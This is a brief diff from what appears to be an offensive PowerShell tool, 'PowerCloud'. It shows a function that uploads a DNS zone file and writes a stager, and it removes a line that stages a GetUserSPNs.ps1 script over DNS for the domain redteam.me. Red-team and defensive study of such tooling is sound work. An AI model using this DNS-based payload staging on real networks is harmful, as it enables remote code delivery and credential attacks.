@@ -181,5 +181,3 @@ function Invoke-PowerCloud() {
     Upload-DNSZoneFile $zoneFile.content
     Write-Stager $zoneFile.count $nameServer
 }
-
-Invoke-PowerCloud -FilePath C:\tools\powercloud\GetUserSPNs.ps1 -domain redteam.me
